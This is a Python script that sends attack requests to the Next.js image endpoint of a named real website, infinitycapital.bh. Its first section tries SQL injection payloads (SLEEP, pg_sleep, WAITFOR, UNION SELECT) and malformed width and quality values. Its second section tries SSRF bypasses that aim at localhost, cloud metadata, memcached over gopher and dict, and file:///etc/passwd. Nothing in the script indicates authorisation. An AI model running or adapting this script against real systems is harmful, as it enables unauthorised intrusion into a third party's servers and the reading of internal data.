import requests, os, time, urllib.parse, sys
U = open('/work/ua_final.txt').read().strip()
H = {'User-Agent': U, 'Accept':'*/*'}
T = "https://www.infinitycapital.bh"
GOOD = "https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
Q = urllib.parse.quote(GOOD, safe='')

def g(path, label=None):
    t0=time.time()
    try:
        r = requests.get(T+path, headers=H, timeout=40, allow_redirects=False)
        dt=time.time()-t0
        body = r.text[:130].replace('\n',' ') if len(r.content)<3000 else r.headers.get('content-type')
        print("%-46s %s len=%-7d %5.2fs %s" % (label or path[:46], r.status_code, len(r.content), dt, body))
        return r, dt
    except Exception as e:
        print("%-46s ERR %s" % (label or path[:46], e)); return None,0

print("=== A. /_next/image param injection ===")
cases = [
 ("q=75 baseline",        "/_next/image?url="+Q+"&w=1080&q=75"),
 ("q=75' single quote",   "/_next/image?url="+Q+"&w=1080&q=75%27"),
 ("q=75 AND SLEEP(3)",    "/_next/image?url="+Q+"&w=1080&q=75%20AND%20SLEEP(3)"),
 ("q=75 pg_sleep(3)",     "/_next/image?url="+Q+"&w=1080&q=75%3BSELECT%20pg_sleep(3)"),
 ("q=75 WAITFOR 3s",      "/_next/image?url="+Q+"&w=1080&q=75%3BWAITFOR%20DELAY%20%270:0:3%27--"),
 ("q UNION SELECT 1",     "/_next/image?url="+Q+"&w=1080&q=75%27%20UNION%20SELECT%20version()--"),
 ("w=1080' OR 1=1--",     "/_next/image?url="+Q+"&w=1080%27%20OR%201%3D1--&q=75"),
 ("w=-1*3*400 arith",     "/_next/image?url="+Q+"&w=-1*3*400&q=75"),
 ("w=+1+1+1",             "/_next/image?url="+Q+"&w=%2B1%2B1%2B1"),
 ("w=1e3",                "/_next/image?url="+Q+"&w=1e3"),
 ("w=0x100",              "/_next/image?url="+Q+"&w=0x100"),
 ("w=2147483648 overflow","/_next/image?url="+Q+"&w=2147483648"),
 ("w=-1 union",           "/_next/image?url="+Q+"&w=-1%20UNION%20SELECT%201"),
 ("w duplicate 1080&1080", "/_next/image?url="+Q+"&w=1080&w=828&q=75"),
]
for lab,p in cases: g(p,lab)

print()
print("=== B. url= SSRF / host-validation bypass ===")
urls = [
 ("baseline-ctf", GOOD),
 ("at-127.0.0.1", "https://images.ctfassets.net@127.0.0.1/"),
 ("at-localhost", "https://images.ctfassets.net@localhost:22/"),
 ("dotdot-meta",  "https://images.ctfassets.net/../../../../latest/meta-data/"),
 ("pct-slash",    "https://images.ctfassets.net%2f%2f%2f127.0.0.1/"),
 ("port-8443",    "https://images.ctfassets.net:8443/"),
 ("pct-host",     "https://images.ctfassets.net%40127.0.0.1/"),
 ("gopher",       "gopher://127.0.0.1:11211/_stats"),
 ("dict",         "dict://127.0.0.1:11211/stat"),
 ("file",         "file:///etc/passwd"),
 ("http-plain",   "http://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"),
]
for lab,u in urls:
    g("/_next/image?url="+urllib.parse.quote(u, safe='')+"&w=640&q=75", "url="+lab)
